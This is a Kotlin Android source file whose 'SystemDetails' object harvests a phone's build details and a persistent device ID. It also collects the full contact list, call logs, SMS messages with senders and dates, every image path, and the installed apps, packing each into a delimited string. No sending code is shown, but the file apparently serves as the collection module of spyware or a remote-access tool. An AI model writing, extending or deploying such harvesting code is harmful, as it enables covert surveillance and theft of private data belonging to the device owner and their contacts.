import android.Manifest
import android.app.Activity
import android.content.Context
import android.os.Build
import java.util.*
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.text.SimpleDateFormat
import android.content.pm.ResolveInfo
import android.content.Intent

object SystemDetails {

    fun getSystemDetails(context: Context): String {
        val model = "Model: ${Build.MODEL}, "
        val id = "ID: ${Build.ID}, "
        val manufacturer = "Manufacturer: ${Build.MANUFACTURER}, "
        val brand = "Brand: ${Build.BRAND}, "
        val type = "Type: ${Build.TYPE}, "
        val user = "User: ${Build.USER}, "
        val base = "Base: ${Build.VERSION_CODES.BASE}, "
        val incremental = "Incremental: ${Build.VERSION.INCREMENTAL}, "
        val sdk = "SDK: ${Build.VERSION.SDK}, "
        val board = "Board: ${Build.BOARD}, "
        val host = "Host: ${Build.HOST}, "
        val fingerprint = "Fingerprint: ${Build.FINGERPRINT}, "
        val versionName = "Version Name: ${Build.VERSION_CODES::class.java.fields[Build.VERSION.SDK_INT].name}, "
        val versionCode = "Version Code: ${Build.VERSION.RELEASE}"

        return "$model$id$manufacturer$brand$type$user$base$incremental$sdk$board$host$fingerprint$versionName$versionCode"
    }

    fun getUUID(context: Context): String {
        val uuid = getDeviceUUID(context)
        val uuidString = "UUID: $uuid"

        return uuidString

    }

    private fun getDeviceUUID(context: Context): String {
        val sharedPrefs = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        var uuid = sharedPrefs.getString("uuid", null)
        if (uuid == null) {
            uuid = UUID.randomUUID().toString()
            sharedPrefs.edit().putString("uuid", uuid).apply()
        }
        return uuid
    }

    fun getContactList(context: Context): String {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CONTACTS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                context as Activity,
                arrayOf(Manifest.permission.READ_CONTACTS),
                0
            )
        }

        val contentResolver: ContentResolver = context.contentResolver
        val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val cursor = contentResolver.query(uri, null, null, null, null)
        val contactList = StringBuilder()

        if (cursor?.count ?: 0 > 0) {
            cursor?.let {
                while (it.moveToNext()) {
                    val contactName =
                        it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val contactNumber =
                        it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    // Use contactName and contactNumber as needed
                    val contactInfo = "ContactName:$contactName ContactNumber:$contactNumber | "
                    contactList.append(contactInfo)
                }
                }
            }
        cursor?.close()
        return contactList.toString()
    }

    fun getCallLogs(context: Context): String {
        if (ContextCompat.checkSelfPermission(
                context,
                Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                context as Activity,
                arrayOf(Manifest.permission.READ_CALL_LOG),
                0
            )
            return "" // Return an empty string if permission is not granted
        }

        val contentResolver: ContentResolver = context.contentResolver
        val uriCallLogs: Uri = Uri.parse("content://call_log/calls")
        val cursorCallLogs = contentResolver.query(uriCallLogs, null, null, null, null)
        val calllogs = StringBuilder()

        cursorCallLogs?.use { cursor ->
            if (cursor.count > 0) {
                while (cursor.moveToNext()) {
                    val stringNumber: String = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                    var stringName: String = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
                    val stringDuration: String = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
                    if (stringName.isEmpty()) {
                        stringName = "NULL"
                    }
                    val stringOutput =
                        "Duration:$stringDuration Number:$stringNumber Name:$stringName | "
                    calllogs.append(stringOutput)
                }
            }
        }

        cursorCallLogs?.close()
        return calllogs.toString()
    }

    data class SMSMessage(
        val message: String,
        val sender: String,
        val date: String,
    )

    fun listOfImages(context: Context): ArrayList<String> {
        val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val cursor: Cursor?
        val column_index_data: Int
        val listOfAllImages: ArrayList<String> = ArrayList()
        var absolutePathOfImage: String

        val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
        val orderBy = MediaStore.Images.Media.DATE_TAKEN + " DESC"

        cursor = context.contentResolver.query(uri, projection, null, null, orderBy)

        cursor?.apply {
            column_index_data = getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)

            while (moveToNext()) {
                absolutePathOfImage = getString(column_index_data)
                listOfAllImages.add(absolutePathOfImage)
            }

            close()
        }

        return listOfAllImages
    }

    fun Long.parsedDate(): String {
        val date = Date(this)
        val format = SimpleDateFormat("dd/MMM/yyyy HH:mm", Locale.getDefault())
        return format.format(date)
    }

    fun readMessages(context: Context, type:String): List<SMSMessage>{
        val messages = mutableListOf<SMSMessage>()
        val cursor = context.contentResolver.query(
            Uri.parse("content://sms/$type"),
            null,
            null,
            null,
            null,
        )
        cursor?.use {
            val indexMessage = it.getColumnIndex("body")
            val indexSender = it.getColumnIndex("address")
            val indexDate = it.getColumnIndex("date")

            while (it.moveToNext()) {
                messages.add(
                    SMSMessage(
                        sender = it.getString(indexSender),
                        message = it.getString(indexMessage),
                        date = it.getLong(indexDate).parsedDate()
                    )
                )
            }
        }
        return messages
    }

    fun formatSMSMessages(messages: List<SMSMessage>): String {
        val stringBuilder = StringBuilder()
        var previousSender: String? = null
        for ((index, message) in messages.withIndex()) {
            if (index > 0 && message.sender == previousSender) {
                stringBuilder.append("Message:${message.message} ")
                stringBuilder.append("Date:${message.date} ")
            } else {
                if (index > 0) {
                    stringBuilder.append("| ") // Add separator between different senders
                }
                stringBuilder.append("(Sender:${message.sender}) ")
                stringBuilder.append("Message:${message.message} ")
                stringBuilder.append("Date:${message.date} ")
            }
            previousSender = message.sender
        }
        return stringBuilder.toString()
    }

    fun installedApps(context: Context): String {
        val packageManager = context.packageManager
        val mainIntent = Intent(Intent.ACTION_MAIN, null)
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
        val resolveInfos: List<ResolveInfo> = packageManager.queryIntentActivities(mainIntent, 0)

        val appNames = StringBuilder()
        for (resolveInfo in resolveInfos) {
            val appName = resolveInfo.loadLabel(packageManager).toString()
            appNames.append("$appName, ")
        }
        // Remove the trailing ", " if there are any app names
        if (appNames.isNotEmpty()) {
            appNames.delete(appNames.length - 2, appNames.length)
        }
        return appNames.toString()
    }

}
